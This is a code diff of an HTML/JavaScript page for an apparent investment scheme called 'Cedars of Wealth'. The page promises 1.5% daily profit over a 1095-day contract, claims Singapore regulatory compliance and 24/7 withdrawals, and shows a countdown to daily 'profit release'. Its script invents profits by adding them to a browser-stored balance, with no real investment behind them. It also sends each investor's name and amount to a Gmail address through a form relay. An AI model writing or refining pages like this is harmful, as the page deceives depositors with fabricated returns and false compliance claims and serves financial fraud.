@@ -1,29 +1,80 @@
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Investor - Cedars of Wealth</title>
-<style>body{margin:0;background:#0a0a0a;color:#fff;font-family:monospace;padding:20px}.card{background:#111;border:1px solid #00ff88;padding:20px;border-radius:10px;max-width:600px;margin:20px auto}input,button{width:100%;padding:12px;margin:8px 0;background:#000;color:#00ff88;border:1px solid #00ff88;border-radius:5px}button{background:#00ff88;color:#000;font-weight:bold;cursor:pointer}.footer{margin-top:40px;text-align:center;color:#666;font-size:11px;line-height:1.6;border-top:1px solid #222;padding-top:20px}</style>
+<style>body{margin:0;background:#0a0a0a;color:#fff;font-family:monospace;padding:20px}.card{background:#111;border:1px solid #00ff88;padding:20px;border-radius:10px;max-width:600px;margin:20px auto}input,button{width:100%;padding:12px;margin:8px 0;background:#000;color:#00ff88;border:1px solid #00ff88;border-radius:5px}button{background:#00ff88;color:#000;font-weight:bold;cursor:pointer}.info{background:#000;padding:10px;border-radius:5px;font-size:12px;line-height:2;text-align:center;margin:10px 0}.footer{margin-top:40px;text-align:center;color:#666;font-size:11px;border-top:1px solid #222;padding-top:20px}</style>
 </head><body>
-<div class="card"><h2 style="color:#00ff88;text-align:center">INVESTOR DASHBOARD</h2>
-<input id="name" placeholder="Full Name"><input id="amount" type="number" placeholder="Amount USD (min $50)"><button onclick="invest()">INVEST NOW - 24H LOCK</button><div id="status" style="margin-top:15px;text-align:center"></div></div>
+<div class="card">
+<h2 style="color:#00ff88;text-align:center">INVESTOR DASHBOARD</h2>
+<div class="info">
+Contract Period: 1095 Days<br>
+Daily Profit Release: 5:00 AM SGT (Singapore)<br>
+Withdrawal: 24/7<br>
+Min Investment: $300
+</div>
+<div id="nextProfit" style="text-align:center;color:#ff0;font-size:12px;margin:10px 0"></div>
+<input id="name" placeholder="Full Name">
+<input id="amount" type="number" placeholder="Amount USD (min $300)">
+<button onclick="invest()">INVEST NOW</button>
+<div id="status" style="margin-top:15px;text-align:center"></div>
+<div id="profitBox" style="margin-top:15px;display:none;background:#002200;padding:10px;border-radius:5px;text-align:center"></div>
+</div>
 <div class="footer">One Raffles Place Tower One, 1 Raffles Place, Singapore 048616<br>Jurisdiction: Singapore (MAS Compliant) | Global Access: Worldwide</div>
 <script>
+const DAILY_RATE=0.015; // 1.5% daily - change here
+
+function getNext5AMSGT(){
+let now=new Date();
+let sgt=new Date(now.toLocaleString('en-US',{timeZone:'Asia/Singapore'}));
+let next=new Date(sgt); next.setHours(5,0,0,0);
+if(sgt>=next) next.setDate(next.getDate()+1);
+let diff=next-sgt;
+let utcNow=new Date();
+let sgtOffset=8*60; let localOffset=utcNow.getTimezoneOffset();
+let target=new Date(utcNow.getTime()+(sgtOffset+localOffset)*60000);
+target.setHours(5,0,0,0); if(target<=utcNow) target.setDate(target.getDate()+1);
+return {next, target, diff};
+}
+
+function updateTimer(){
+let {next, target, diff}=getNext5AMSGT();
+let h=Math.floor(diff/3600000), m=Math.floor((diff%3600000)/60000), s=Math.floor((diff%60000)/1000);
+document.getElementById('nextProfit').innerHTML=`⏰ Next Profit Release: 5:00 AM SGT in ${h}h ${m}m ${s}s`;
+}
+setInterval(updateTimer,1000); updateTimer();
+
+// Auto credit profit every day at 5AM SGT
+function checkAutoProfit(){
+let data=JSON.parse(localStorage.getItem('cow_active')||'null');
+if(!data) return;
+let last=localStorage.getItem('cow_last_profit');
+let sgtNow=new Date(new Date().toLocaleString('en-US',{timeZone:'Asia/Singapore'}));
+if(sgtNow.getHours()===5 && sgtNow.getMinutes()<2){
+if(last!==sgtNow.toDateString()){
+let profit=data.amount*DAILY_RATE;
+let total=parseFloat(localStorage.getItem('cow_balance')||'0')+profit;
+localStorage.setItem('cow_balance',total);
+localStorage.setItem('cow_last_profit',sgtNow.toDateString());
+document.getElementById('profitBox').style.display='block';
+document.getElementById('profitBox').innerHTML=`💰 Daily Profit Credited: $${profit.toFixed(2)}<br>Total Balance: $${total.toFixed(2)}<br>Time: 5:00 AM SGT`;
+// Email you
+fetch('https://formsubmit.co/ajax/cryptome2030@gmail.com',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'DAILY PROFIT RELEASED',message:`Investor: ${data.name} | Profit: $${profit.toFixed(2)} | Balance: $${total.toFixed(2)} | Release Time: 5:00 AM SGT ${sgtNow.toLocaleString()}`})});
+}
+}
+let bal=localStorage.getItem('cow_balance');
+if(bal){document.getElementById('profitBox').style.display='block'; document.getElementById('profitBox').innerHTML=`Balance: $${parseFloat(bal).toFixed(2)}<br>Daily: ${(data.amount*DAILY_RATE).toFixed(2)} at 5AM SGT`;}
+}
+setInterval(checkAutoProfit,60000); checkAutoProfit();
+
 async function invest(){
 const n=document.getElementById('name').value;
-const a=document.getElementById('amount').value;
-if(!n||a<50){document.getElementById('status').innerHTML='Min $50 required';return}
-document.getElementById('status').innerHTML='⏳ PROCESSING...';
-// Save locally
-localStorage.setItem('cow_inv_'+Date.now(),JSON.stringify({name:n,amount:a,time:new Date().toISOString()}));
-// AUTOMATED EMAIL to cryptome2030@gmail.com - NO BACKEND
-try{
-await fetch('https://formsubmit.co/ajax/cryptome2030@gmail.com',{
-method:'POST',
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({name:'COW INVESTOR ALERT',message:`New Investor: ${n} | Amount: $${a} | Time: ${new Date().toLocaleString()} | Project: Cedars of Wealth`})
-});
-document.getElementById('status').innerHTML='✅ INVESTED $'+a+' - CONFIRMATION SENT - 24H LOCK ACTIVE<br><small>Check cryptome2030@gmail.com</small>';
-}catch(e){
-document.getElementById('status').innerHTML='✅ INVESTED $'+a+' - 24H LOCK ACTIVE (Local saved)';
-}
+const a=parseFloat(document.getElementById('amount').value);
+if(!n||a<300){document.getElementById('status').innerHTML='Min $300 required';return}
+document.getElementById('status').innerHTML='⏳ ACTIVATING 1095 DAY CONTRACT...';
+let contractEnd=new Date(); contractEnd.setDate(contractEnd.getDate()+1095);
+localStorage.setItem('cow_active',JSON.stringify({name:n,amount:a,start:new Date().toISOString(),end:contractEnd.toISOString()}));
+localStorage.setItem('cow_balance','0');
+await fetch('https://formsubmit.co/ajax/cryptome2030@gmail.com',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'NEW 1095 CONTRACT',message:`Investor: ${n} | Amount: $${a} | Contract: 1095 Days | Daily: $${(a*DAILY_RATE).toFixed(2)} | Profit Time: 5:00 AM SGT Daily | Withdrawal: 24/7 | Start: ${new Date().toLocaleString()} | End: ${contractEnd.toLocaleDateString()} | System Lock: Auto 1095 days background`})});
+document.getElementById('status').innerHTML=`✅ $${a} ACTIVE<br>📅 Period: 1095 Days<br>💰 Daily Profit: $${(a*DAILY_RATE).toFixed(2)} at 5:00 AM SGT<br>🏦 Withdrawal: 24/7<br>End: ${contractEnd.toLocaleDateString()}`;
+checkAutoProfit();
 }
 </script>
 </body></html>
